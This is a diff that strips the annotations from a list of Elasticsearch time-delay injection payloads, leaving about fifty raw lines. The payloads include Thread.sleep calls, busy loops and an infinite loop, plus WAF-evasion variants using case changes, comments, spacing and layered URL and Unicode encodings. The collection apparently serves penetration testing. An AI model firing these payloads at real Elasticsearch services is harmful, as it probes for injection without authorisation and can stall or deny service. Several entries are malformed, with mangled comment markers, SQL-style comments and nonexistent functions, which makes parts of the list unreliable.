@@ -1,106 +1,50 @@
-# Elasticsearch
-
-These payloads cause time delays to prove interaction via injection. Variations include case changes, comments, encodings (URL, double URL, Unicode), inline spaces/comments, and WAF bypass tricks like nested functions or heavy computations.
-
-- **{"script_score": {"script": "Thread.sleep(5000)"}}**  
-  Standard Thread sleep.
-- **{"query": {"script_score": {"script": "Thread.sleep(5000)"}}}**  
-  Query script sleep.
-- **{"script": "Thread.sleep(5000)"}**  
-  Direct script sleep.
-- **%7B%22script_score%22%3A%20%7B%22script%22%3A%20%22Thread.sleep%285000%29%22%7D%7D**  
-  URL-encoded sleep.
-- **{"script": "ThReAd.SlEeP(5000)"}**  
-  Case variation sleep.
-- **{"script": /*comment*/"Thread.sleep(5000)"/*comment*/}**  
-  Groovy comment sleep.
-- **{"script": "Thread . sleep(5000)"}**  
-  Spaced Thread.
-- **{"script": "Thread.sleep/**/(5000)"}**  
-  Comment param.
-- **\u007B"script": "Thread.sleep(5000)"\u007D**  
-  Unicode JSON sleep.
-- **%2527{"script": "Thread.sleep(5000)"}**  
-  Double quote URL.
-- **{"script": "if(true){Thread.sleep(5000)}"}**  
-  If conditional sleep.
-- **{"script": "long start = System.currentTimeMillis(); while (System.currentTimeMillis() - start < 5000) {}"}**  
-  While time loop.
-- **{"script": "for(long i=0; i<100000000L; i++){}"}**  
-  Long for loop.
-- **{"query": {"bool": {"filter": {"script": {"script": "Thread.sleep(5000)"}}}}}**  
-  Bool filter sleep.
-- **{"script": "Thread.sleep(10000)"}**  
-  Longer sleep.
-- **{"script": "Thread.sleep(5000); return score;"}**  
-  Return after sleep.
-- **{"script": "def start = System.currentTimeMillis(); while (System.currentTimeMillis() - start < 5000) {} return 1;"}**  
-  Def while loop.
-- **%7B%22script%22%3A%22Thread.sleep%285000%29%22%7D**  
-  URL direct script.
-- **{"script": "Thread.sleep(5000) or 1"}**  
-  Or logical.
-- **{"script": "1 && Thread.sleep(5000)"}**  
-  And logical.
-- **{"script": "Thread.sleep(5000)//"}**  
-  Line comment.
-- **{"script": "Thread.sleep(5000)#"}**  
-  Hash comment.
-- **{"script": "Thread.sleep(5000)--"}**  
-  Dash comment.
-- **\u007B\u0022script\u0022\u003A \u0022Thread.sleep\u00285000\u0029\u0022\u007D**  
-  Full Unicode.
-- **{"script": "Thread.sleep(concat(5000))"}**  
-  Concat param.
-- **{"query": {"script_fields": {"test": {"script": "Thread.sleep(5000)"}}}}**  
-  Script fields sleep.
-- **{"script": "java.lang.Thread.sleep(5000)"}**  
-  Full class sleep.
-- **{"script": "new java.lang.Thread().sleep(5000)"}**  
-  New instance sleep.
-- **%25257B%252522script%252522%25253A%252522Thread.sleep%2525285000%252529%252522%25257D**  
-  Triple URL.
-- **{"script": "sleep(5000)"}**  
-  Alias sleep.
-- **{"script": "if (doc['field'].value == 'val') Thread.sleep(5000)"}**  
-  Doc conditional.
-- **{"script": "Thread.sleep/* */(5000)"}**  
-  Comment in call.
-- **{"script": "T h r e a d . s l e e p (5000)"}**  
-  Fully spaced.
-- **{"script": "Thread.sleep(5000);"}**  
-  Semicolon sleep.
-- **{"script": "return Thread.sleep(5000);"}**  
-  Return sleep.
-- **{"script": "while(true){}"}**  
-  Infinite while.
-- **{"script": "long i=0; while(i<100000000){i++;}"}**  
-  While increment.
-- **{"query": {"match_all": {}, "script_score": {"script": "Thread.sleep(5000)"}}}**  
-  Match all + sleep.
-- **{"script": "Thread.sleep(5000) == null ? 0 : 1"}**  
-  Ternary sleep.
-- **{"script": "def delay=5000; Thread.sleep(delay)"}**  
-  Def var sleep.
-- **{"script": "Thread.sleep(params.delay)" , "params": {"delay":5000}}**  
-  Params sleep.
-- **{"script": "import java.lang.Thread; Thread.sleep(5000)"}**  
-  Import sleep.
-- **{"script": "Thread.sleep(5000) /*comment*/"}**  
-  Block comment.
-- **{"script": "Thread.sleep(5000) // comment"}**  
-  Line comment after.
-- **%7B%22script%22%3A%22Thread%2Esleep%285000%29%20or%201%22%7D**  
-  Dot + or.
-- **{"script": "Thread.sleep(5000) and true"}**  
-  And true sleep.
-- **{"script": "if(1==1) Thread.sleep(5000)"}**  
-  If number sleep.
-- **{"script": "Thread.sleep(stringToLong('5000'))"}**  
-  String convert.
-- **{"script": "Thread.sleep(5*1000)"}**  
-  Math sleep.
-- **{"script": "for(int i=0;i<100;i++){Thread.sleep(50)}"}**  
-  Loop small sleeps.
-
-
+{"script_score": {"script": "Thread.sleep(5000)"}}
+{"query": {"script_score": {"script": "Thread.sleep(5000)"}}}
+{"script": "Thread.sleep(5000)"}
+%7B%22script_score%22%3A%20%7B%22script%22%3A%20%22Thread.sleep%285000%29%22%7D%7D
+{"script": "ThReAd.SlEeP(5000)"}
+{"script": /comment/"Thread.sleep(5000)"/comment/}
+{"script": "Thread . sleep(5000)"}
+{"script": "Thread.sleep/**/(5000)"}
+\u007B"script": "Thread.sleep(5000)"\u007D
+%2527{"script": "Thread.sleep(5000)"}
+{"script": "if(true){Thread.sleep(5000)}"}
+{"script": "long start = System.currentTimeMillis(); while (System.currentTimeMillis() - start < 5000) {}"}
+{"script": "for(long i=0; i<100000000L; i++){}"}
+{"query": {"bool": {"filter": {"script": {"script": "Thread.sleep(5000)"}}}}}
+{"script": "Thread.sleep(10000)"}
+{"script": "Thread.sleep(5000); return score;"}
+{"script": "def start = System.currentTimeMillis(); while (System.currentTimeMillis() - start < 5000) {} return 1;"}
+%7B%22script%22%3A%22Thread.sleep%285000%29%22%7D
+{"script": "Thread.sleep(5000) or 1"}
+{"script": "1 && Thread.sleep(5000)"}
+{"script": "Thread.sleep(5000)//"}
+{"script": "Thread.sleep(5000)#"}
+{"script": "Thread.sleep(5000)--"}
+\u007B\u0022script\u0022\u003A \u0022Thread.sleep\u00285000\u0029\u0022\u007D
+{"script": "Thread.sleep(concat(5000))"}
+{"query": {"script_fields": {"test": {"script": "Thread.sleep(5000)"}}}}
+{"script": "java.lang.Thread.sleep(5000)"}
+{"script": "new java.lang.Thread().sleep(5000)"}
+%25257B%252522script%252522%25253A%252522Thread.sleep%2525285000%252529%252522%25257D
+{"script": "sleep(5000)"}
+{"script": "if (doc['field'].value == 'val') Thread.sleep(5000)"}
+{"script": "Thread.sleep/* */(5000)"}
+{"script": "T h r e a d . s l e e p (5000)"}
+{"script": "Thread.sleep(5000);"}
+{"script": "return Thread.sleep(5000);"}
+{"script": "while(true){}"}
+{"script": "long i=0; while(i<100000000){i++;}"}
+{"query": {"match_all": {}, "script_score": {"script": "Thread.sleep(5000)"}}}
+{"script": "Thread.sleep(5000) == null ? 0 : 1"}
+{"script": "def delay=5000; Thread.sleep(delay)"}
+{"script": "Thread.sleep(params.delay)" , "params": {"delay":5000}}
+{"script": "import java.lang.Thread; Thread.sleep(5000)"}
+{"script": "Thread.sleep(5000) /comment/"}
+{"script": "Thread.sleep(5000) // comment"}
+%7B%22script%22%3A%22Thread%2Esleep%285000%29%20or%201%22%7D
+{"script": "Thread.sleep(5000) and true"}
+{"script": "if(1==1) Thread.sleep(5000)"}
+{"script": "Thread.sleep(stringToLong('5000'))"}
+{"script": "Thread.sleep(5*1000)"}
+{"script": "for(int i=0;i<100;i++){Thread.sleep(50)}"}
